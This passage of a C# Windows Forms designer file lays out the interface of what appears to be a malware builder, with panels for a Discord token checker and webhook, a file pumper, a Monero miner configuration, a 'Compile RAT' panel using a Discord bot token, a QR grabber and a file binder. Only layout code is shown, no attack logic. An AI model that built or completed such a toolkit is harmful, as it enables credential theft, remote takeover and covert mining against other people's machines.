            this.textBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox2.ForeColor = System.Drawing.Color.DarkRed;
            this.textBox2.Location = new System.Drawing.Point(37, 305);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(341, 19);
            this.textBox2.TabIndex = 16;
            this.textBox2.Text = "https://tenor.com/view/anton-hacker-hack-ha-bogus-gif-24545968";
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label23.ForeColor = System.Drawing.Color.DarkRed;
            this.label23.Location = new System.Drawing.Point(35, 195);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(83, 20);
            this.label23.TabIndex = 15;
            this.label23.Text = "Username";
            // 
            // userBox
            // 
            this.userBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.userBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.userBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.userBox.ForeColor = System.Drawing.Color.DarkRed;
            this.userBox.Location = new System.Drawing.Point(37, 223);
            this.userBox.Name = "userBox";
            this.userBox.Size = new System.Drawing.Size(276, 19);
            this.userBox.TabIndex = 14;
            this.userBox.Text = " ٴٴٴٴٴ ";
            // 
            // tokenChecker
            // 
            this.tokenChecker.Cursor = System.Windows.Forms.Cursors.Hand;
            this.tokenChecker.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.tokenChecker.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.tokenChecker.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.tokenChecker.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.tokenChecker.ForeColor = System.Drawing.Color.DarkRed;
            this.tokenChecker.Location = new System.Drawing.Point(644, 136);
            this.tokenChecker.Name = "tokenChecker";
            this.tokenChecker.Size = new System.Drawing.Size(83, 24);
            this.tokenChecker.TabIndex = 13;
            this.tokenChecker.Text = "Check";
            this.tokenChecker.UseVisualStyleBackColor = true;
            this.tokenChecker.Click += new System.EventHandler(this.tokenChecker_Click);
            // 
            // label29
            // 
            this.label29.AutoSize = true;
            this.label29.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label29.ForeColor = System.Drawing.Color.DarkRed;
            this.label29.Location = new System.Drawing.Point(384, 108);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(53, 20);
            this.label29.TabIndex = 12;
            this.label29.Text = "Token";
            // 
            // button4
            // 
            this.button4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button4.ForeColor = System.Drawing.Color.DarkRed;
            this.button4.Location = new System.Drawing.Point(295, 136);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(83, 24);
            this.button4.TabIndex = 13;
            this.button4.Text = "Check";
            this.button4.UseVisualStyleBackColor = true;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // TokenCheckerBox
            // 
            this.TokenCheckerBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.TokenCheckerBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.TokenCheckerBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.TokenCheckerBox.ForeColor = System.Drawing.Color.DarkRed;
            this.TokenCheckerBox.Location = new System.Drawing.Point(386, 136);
            this.TokenCheckerBox.Name = "TokenCheckerBox";
            this.TokenCheckerBox.Size = new System.Drawing.Size(253, 19);
            this.TokenCheckerBox.TabIndex = 11;
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label22.ForeColor = System.Drawing.Color.DarkRed;
            this.label22.Location = new System.Drawing.Point(35, 108);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(77, 20);
            this.label22.TabIndex = 12;
            this.label22.Text = "Webhook";
            // 
            // miscWebhookBox
            // 
            this.miscWebhookBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.miscWebhookBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.miscWebhookBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.miscWebhookBox.ForeColor = System.Drawing.Color.DarkRed;
            this.miscWebhookBox.Location = new System.Drawing.Point(37, 136);
            this.miscWebhookBox.Name = "miscWebhookBox";
            this.miscWebhookBox.Size = new System.Drawing.Size(253, 19);
            this.miscWebhookBox.TabIndex = 11;
            // 
            // gbBox
            // 
            this.gbBox.AutoSize = true;
            this.gbBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.gbBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.gbBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.gbBox.ForeColor = System.Drawing.Color.DarkRed;
            this.gbBox.Location = new System.Drawing.Point(239, 40);
            this.gbBox.Name = "gbBox";
            this.gbBox.Size = new System.Drawing.Size(40, 19);
            this.gbBox.TabIndex = 10;
            this.gbBox.Text = "GB";
            this.gbBox.UseVisualStyleBackColor = true;
            this.gbBox.CheckedChanged += new System.EventHandler(this.gbBox_CheckedChanged);
            // 
            // mbBox
            // 
            this.mbBox.AutoSize = true;
            this.mbBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.mbBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.mbBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.mbBox.ForeColor = System.Drawing.Color.DarkRed;
            this.mbBox.Location = new System.Drawing.Point(191, 40);
            this.mbBox.Name = "mbBox";
            this.mbBox.Size = new System.Drawing.Size(42, 19);
            this.mbBox.TabIndex = 9;
            this.mbBox.Text = "MB";
            this.mbBox.UseVisualStyleBackColor = true;
            this.mbBox.CheckedChanged += new System.EventHandler(this.mbBox_CheckedChanged);
            // 
            // kbBox
            // 
            this.kbBox.AutoSize = true;
            this.kbBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.kbBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.kbBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.kbBox.ForeColor = System.Drawing.Color.DarkRed;
            this.kbBox.Location = new System.Drawing.Point(147, 40);
            this.kbBox.Name = "kbBox";
            this.kbBox.Size = new System.Drawing.Size(39, 19);
            this.kbBox.TabIndex = 8;
            this.kbBox.Text = "KB";
            this.kbBox.UseVisualStyleBackColor = true;
            this.kbBox.CheckedChanged += new System.EventHandler(this.kbBox_CheckedChanged);
            // 
            // pumpPathBox
            // 
            this.pumpPathBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.pumpPathBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.pumpPathBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.pumpPathBox.ForeColor = System.Drawing.Color.DarkRed;
            this.pumpPathBox.Location = new System.Drawing.Point(161, 67);
            this.pumpPathBox.Name = "pumpPathBox";
            this.pumpPathBox.ReadOnly = true;
            this.pumpPathBox.Size = new System.Drawing.Size(375, 19);
            this.pumpPathBox.TabIndex = 1;
            // 
            // minerSite
            // 
            this.minerSite.Controls.Add(this.label37);
            this.minerSite.Controls.Add(this.label52);
            this.minerSite.Controls.Add(this.label53);
            this.minerSite.Controls.Add(this.textBox1);
            this.minerSite.Controls.Add(this.label54);
            this.minerSite.Controls.Add(this.textBox3);
            this.minerSite.Controls.Add(this.checkBox2);
            this.minerSite.Controls.Add(this.checkBox3);
            this.minerSite.Controls.Add(this.checkBox4);
            this.minerSite.Controls.Add(this.label57);
            this.minerSite.Controls.Add(this.textBox6);
            this.minerSite.Location = new System.Drawing.Point(96, 0);
            this.minerSite.Name = "minerSite";
            this.minerSite.Size = new System.Drawing.Size(751, 522);
            this.minerSite.TabIndex = 18;
            // 
            // label37
            // 
            this.label37.AutoSize = true;
            this.label37.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label37.ForeColor = System.Drawing.Color.DarkRed;
            this.label37.Location = new System.Drawing.Point(35, 276);
            this.label37.Name = "label37";
            this.label37.Size = new System.Drawing.Size(90, 20);
            this.label37.TabIndex = 19;
            this.label37.Text = "CPU usage";
            // 
            // label52
            // 
            this.label52.AutoSize = true;
            this.label52.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label52.ForeColor = System.Drawing.Color.DarkRed;
            this.label52.Location = new System.Drawing.Point(35, 375);
            this.label52.Name = "label52";
            this.label52.Size = new System.Drawing.Size(533, 60);
            this.label52.TabIndex = 18;
            this.label52.Text = "1. Setup your pool (ex. pool.minergate.com:443)\r\n2. Setup your username. If you\'r" +
    "e using minergate fill in your email address.\r\n3. To setup workers\' name change " +
    "password variable.";
            // 
            // label53
            // 
            this.label53.AutoSize = true;
            this.label53.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label53.ForeColor = System.Drawing.Color.DarkRed;
            this.label53.Location = new System.Drawing.Point(35, 197);
            this.label53.Name = "label53";
            this.label53.Size = new System.Drawing.Size(78, 20);
            this.label53.TabIndex = 17;
            this.label53.Text = "Password";
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox1.ForeColor = System.Drawing.Color.DarkRed;
            this.textBox1.Location = new System.Drawing.Point(37, 225);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(389, 19);
            this.textBox1.TabIndex = 16;
            // 
            // label54
            // 
            this.label54.AutoSize = true;
            this.label54.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label54.ForeColor = System.Drawing.Color.DarkRed;
            this.label54.Location = new System.Drawing.Point(35, 115);
            this.label54.Name = "label54";
            this.label54.Size = new System.Drawing.Size(83, 20);
            this.label54.TabIndex = 15;
            this.label54.Text = "Username";
            // 
            // textBox3
            // 
            this.textBox3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox3.ForeColor = System.Drawing.Color.DarkRed;
            this.textBox3.Location = new System.Drawing.Point(37, 143);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(389, 19);
            this.textBox3.TabIndex = 14;
            // 
            // checkBox2
            // 
            this.checkBox2.AutoSize = true;
            this.checkBox2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkBox2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.checkBox2.ForeColor = System.Drawing.Color.DarkRed;
            this.checkBox2.Location = new System.Drawing.Point(156, 297);
            this.checkBox2.Name = "checkBox2";
            this.checkBox2.Size = new System.Drawing.Size(48, 19);
            this.checkBox2.TabIndex = 10;
            this.checkBox2.Text = "75%";
            this.checkBox2.UseVisualStyleBackColor = true;
            this.checkBox2.CheckedChanged += new System.EventHandler(this.checkBox2_CheckedChanged);
            // 
            // checkBox3
            // 
            this.checkBox3.AutoSize = true;
            this.checkBox3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkBox3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.checkBox3.ForeColor = System.Drawing.Color.DarkRed;
            this.checkBox3.Location = new System.Drawing.Point(102, 297);
            this.checkBox3.Name = "checkBox3";
            this.checkBox3.Size = new System.Drawing.Size(48, 19);
            this.checkBox3.TabIndex = 9;
            this.checkBox3.Text = "50%";
            this.checkBox3.UseVisualStyleBackColor = true;
            this.checkBox3.CheckedChanged += new System.EventHandler(this.checkBox3_CheckedChanged);
            // 
            // checkBox4
            // 
            this.checkBox4.AutoSize = true;
            this.checkBox4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkBox4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.checkBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.checkBox4.ForeColor = System.Drawing.Color.DarkRed;
            this.checkBox4.Location = new System.Drawing.Point(49, 297);
            this.checkBox4.Name = "checkBox4";
            this.checkBox4.Size = new System.Drawing.Size(48, 19);
            this.checkBox4.TabIndex = 8;
            this.checkBox4.Text = "25%";
            this.checkBox4.UseVisualStyleBackColor = true;
            this.checkBox4.CheckedChanged += new System.EventHandler(this.checkBox4_CheckedChanged);
            // 
            // label57
            // 
            this.label57.AutoSize = true;
            this.label57.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label57.ForeColor = System.Drawing.Color.DarkRed;
            this.label57.Location = new System.Drawing.Point(35, 39);
            this.label57.Name = "label57";
            this.label57.Size = new System.Drawing.Size(97, 20);
            this.label57.TabIndex = 2;
            this.label57.Text = "Monero pool";
            // 
            // textBox6
            // 
            this.textBox6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.textBox6.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.textBox6.ForeColor = System.Drawing.Color.DarkRed;
            this.textBox6.Location = new System.Drawing.Point(37, 67);
            this.textBox6.Name = "textBox6";
            this.textBox6.Size = new System.Drawing.Size(499, 19);
            this.textBox6.TabIndex = 1;
            // 
            // ratSite
            // 
            this.ratSite.Controls.Add(this.ratCompileButton);
            this.ratSite.Controls.Add(this.label45);
            this.ratSite.Controls.Add(this.mainSite);
            this.ratSite.Controls.Add(this.insertButton);
            this.ratSite.Controls.Add(this.label43);
            this.ratSite.Controls.Add(this.pipBox);
            this.ratSite.Controls.Add(this.label42);
            this.ratSite.Controls.Add(this.ratTokenBox);
            this.ratSite.Controls.Add(this.label40);
            this.ratSite.Controls.Add(this.minerSite);
            this.ratSite.Controls.Add(this.ratInstallButton);
            this.ratSite.Controls.Add(this.label41);
            this.ratSite.Controls.Add(this.label44);
            this.ratSite.Controls.Add(this.rURLBox);
            this.ratSite.Location = new System.Drawing.Point(1014, 82);
            this.ratSite.Name = "ratSite";
            this.ratSite.Size = new System.Drawing.Size(751, 522);
            this.ratSite.TabIndex = 19;
            // 
            // ratCompileButton
            // 
            this.ratCompileButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ratCompileButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ratCompileButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ratCompileButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ratCompileButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.ratCompileButton.ForeColor = System.Drawing.Color.DarkRed;
            this.ratCompileButton.Location = new System.Drawing.Point(573, 263);
            this.ratCompileButton.Name = "ratCompileButton";
            this.ratCompileButton.Size = new System.Drawing.Size(83, 24);
            this.ratCompileButton.TabIndex = 39;
            this.ratCompileButton.Text = "Compile";
            this.ratCompileButton.UseVisualStyleBackColor = true;
            this.ratCompileButton.Click += new System.EventHandler(this.ratCompileButton_Click);
            // 
            // label45
            // 
            this.label45.AutoSize = true;
            this.label45.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label45.ForeColor = System.Drawing.Color.DarkRed;
            this.label45.Location = new System.Drawing.Point(454, 262);
            this.label45.Name = "label45";
            this.label45.Size = new System.Drawing.Size(102, 20);
            this.label45.TabIndex = 38;
            this.label45.Text = "Compile RAT";
            // 
            // insertButton
            // 
            this.insertButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.insertButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.insertButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.insertButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.insertButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.insertButton.ForeColor = System.Drawing.Color.DarkRed;
            this.insertButton.Location = new System.Drawing.Point(564, 195);
            this.insertButton.Name = "insertButton";
            this.insertButton.Size = new System.Drawing.Size(83, 24);
            this.insertButton.TabIndex = 37;
            this.insertButton.Text = "Insert";
            this.insertButton.UseVisualStyleBackColor = true;
            this.insertButton.Click += new System.EventHandler(this.insertButton_Click);
            // 
            // label43
            // 
            this.label43.AutoSize = true;
            this.label43.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label43.ForeColor = System.Drawing.Color.DarkRed;
            this.label43.Location = new System.Drawing.Point(454, 195);
            this.label43.Name = "label43";
            this.label43.Size = new System.Drawing.Size(94, 20);
            this.label43.TabIndex = 36;
            this.label43.Text = "Insert token";
            // 
            // pipBox
            // 
            this.pipBox.AutoSize = true;
            this.pipBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pipBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.pipBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.pipBox.ForeColor = System.Drawing.Color.DarkRed;
            this.pipBox.Location = new System.Drawing.Point(59, 215);
            this.pipBox.Name = "pipBox";
            this.pipBox.Size = new System.Drawing.Size(91, 19);
            this.pipBox.TabIndex = 35;
            this.pipBox.Text = "PIP Installed";
            this.pipBox.UseVisualStyleBackColor = true;
            // 
            // label42
            // 
            this.label42.AutoSize = true;
            this.label42.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label42.ForeColor = System.Drawing.Color.DarkRed;
            this.label42.Location = new System.Drawing.Point(22, 100);
            this.label42.Name = "label42";
            this.label42.Size = new System.Drawing.Size(140, 20);
            this.label42.TabIndex = 34;
            this.label42.Text = "Discord Bot Token";
            // 
            // ratTokenBox
            // 
            this.ratTokenBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.ratTokenBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.ratTokenBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.ratTokenBox.ForeColor = System.Drawing.Color.DarkRed;
            this.ratTokenBox.Location = new System.Drawing.Point(24, 128);
            this.ratTokenBox.Name = "ratTokenBox";
            this.ratTokenBox.Size = new System.Drawing.Size(703, 19);
            this.ratTokenBox.TabIndex = 33;
            // 
            // label40
            // 
            this.label40.AutoSize = true;
            this.label40.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label40.ForeColor = System.Drawing.Color.DarkRed;
            this.label40.Location = new System.Drawing.Point(22, 195);
            this.label40.Name = "label40";
            this.label40.Size = new System.Drawing.Size(188, 20);
            this.label40.TabIndex = 32;
            this.label40.Text = "Requirements installation";
            // 
            // ratInstallButton
            // 
            this.ratInstallButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ratInstallButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ratInstallButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ratInstallButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ratInstallButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.ratInstallButton.ForeColor = System.Drawing.Color.DarkRed;
            this.ratInstallButton.Location = new System.Drawing.Point(243, 195);
            this.ratInstallButton.Name = "ratInstallButton";
            this.ratInstallButton.Size = new System.Drawing.Size(83, 24);
            this.ratInstallButton.TabIndex = 31;
            this.ratInstallButton.Text = "Install";
            this.ratInstallButton.UseVisualStyleBackColor = true;
            this.ratInstallButton.Click += new System.EventHandler(this.ratInstallButton_Click);
            // 
            // label41
            // 
            this.label41.AutoSize = true;
            this.label41.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label41.ForeColor = System.Drawing.Color.DarkRed;
            this.label41.Location = new System.Drawing.Point(7, 273);
            this.label41.Name = "label41";
            this.label41.Size = new System.Drawing.Size(489, 165);
            this.label41.TabIndex = 18;
            this.label41.Text = resources.GetString("label41.Text");
            // 
            // label44
            // 
            this.label44.AutoSize = true;
            this.label44.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label44.ForeColor = System.Drawing.Color.DarkRed;
            this.label44.Location = new System.Drawing.Point(22, 23);
            this.label44.Name = "label44";
            this.label44.Size = new System.Drawing.Size(65, 20);
            this.label44.TabIndex = 2;
            this.label44.Text = "RAT Url";
            // 
            // rURLBox
            // 
            this.rURLBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.rURLBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.rURLBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.rURLBox.ForeColor = System.Drawing.Color.DarkRed;
            this.rURLBox.Location = new System.Drawing.Point(24, 51);
            this.rURLBox.Name = "rURLBox";
            this.rURLBox.Size = new System.Drawing.Size(703, 19);
            this.rURLBox.TabIndex = 1;
            // 
            // qrSite
            // 
            this.qrSite.Controls.Add(this.label51);
            this.qrSite.Controls.Add(this.button7);
            this.qrSite.Controls.Add(this.label50);
            this.qrSite.Controls.Add(this.qrStartBtn);
            this.qrSite.Controls.Add(this.label46);
            this.qrSite.Location = new System.Drawing.Point(1051, 120);
            this.qrSite.Name = "qrSite";
            this.qrSite.Size = new System.Drawing.Size(751, 522);
            this.qrSite.TabIndex = 20;
            // 
            // label51
            // 
            this.label51.AutoSize = true;
            this.label51.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label51.ForeColor = System.Drawing.Color.DarkRed;
            this.label51.Location = new System.Drawing.Point(14, 143);
            this.label51.Name = "label51";
            this.label51.Size = new System.Drawing.Size(666, 120);
            this.label51.TabIndex = 46;
            this.label51.Text = resources.GetString("label51.Text");
            // 
            // button7
            // 
            this.button7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button7.ForeColor = System.Drawing.Color.DarkRed;
            this.button7.Location = new System.Drawing.Point(207, 32);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(83, 24);
            this.button7.TabIndex = 45;
            this.button7.Text = "Install";
            this.button7.UseVisualStyleBackColor = true;
            this.button7.Click += new System.EventHandler(this.button7_Click);
            // 
            // label50
            // 
            this.label50.AutoSize = true;
            this.label50.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label50.ForeColor = System.Drawing.Color.DarkRed;
            this.label50.Location = new System.Drawing.Point(19, 32);
            this.label50.Name = "label50";
            this.label50.Size = new System.Drawing.Size(148, 20);
            this.label50.TabIndex = 44;
            this.label50.Text = "Install requirements";
            // 
            // qrStartBtn
            // 
            this.qrStartBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.qrStartBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.qrStartBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.qrStartBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.qrStartBtn.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.qrStartBtn.ForeColor = System.Drawing.Color.DarkRed;
            this.qrStartBtn.Location = new System.Drawing.Point(207, 86);
            this.qrStartBtn.Name = "qrStartBtn";
            this.qrStartBtn.Size = new System.Drawing.Size(83, 24);
            this.qrStartBtn.TabIndex = 39;
            this.qrStartBtn.Text = "Start";
            this.qrStartBtn.UseVisualStyleBackColor = true;
            this.qrStartBtn.Click += new System.EventHandler(this.qrStartBtn_Click);
            // 
            // label46
            // 
            this.label46.AutoSize = true;
            this.label46.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label46.ForeColor = System.Drawing.Color.DarkRed;
            this.label46.Location = new System.Drawing.Point(19, 87);
            this.label46.Name = "label46";
            this.label46.Size = new System.Drawing.Size(135, 20);
            this.label46.TabIndex = 38;
            this.label46.Text = "Start QR Grabber";
            // 
            // binderSite
            // 
            this.binderSite.Controls.Add(this.label64);
            this.binderSite.Controls.Add(this.button13);
            this.binderSite.Controls.Add(this.button12);
            this.binderSite.Controls.Add(this.button10);
            this.binderSite.Controls.Add(this.button9);
            this.binderSite.Controls.Add(this.button11);
            this.binderSite.Controls.Add(this.label59);
            this.binderSite.Controls.Add(this.label58);
            this.binderSite.Controls.Add(this.label49);
